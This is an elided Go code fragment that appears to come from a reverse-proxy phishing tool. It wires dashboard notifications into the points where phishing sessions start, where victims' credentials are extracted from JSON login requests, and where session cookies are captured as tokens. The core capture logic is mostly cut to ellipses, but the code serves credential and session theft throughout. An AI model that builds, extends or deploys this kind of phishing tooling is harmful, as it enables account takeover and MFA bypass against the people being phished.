						...
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								...
								if err == nil {
									...
									if p.dashboard != nil {
										p.dashboard.NotifyNewSession(session)
									}
						...
						if json_re.MatchString(contentType) {
							...
							if pl.username.tp == "json" {
								...
								if um != nil && len(um) > 1 {
									...
									// Notify dashboard of credential capture
									if p.dashboard != nil {
										if session, ok := p.sessions[ps.SessionId]; ok {
											p.dashboard.NotifyCredentialCapture(session)
										}
									}
								}
							}
					...
					if at != nil {
						...
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
								...
								// Notify dashboard of token capture
								if p.dashboard != nil {
									p.dashboard.NotifyTokenCapture(s, "cookie")
								}
							}
						}
					}
...
func (p *HttpProxy) SetDashboard(dashboard *WebDashboard) {
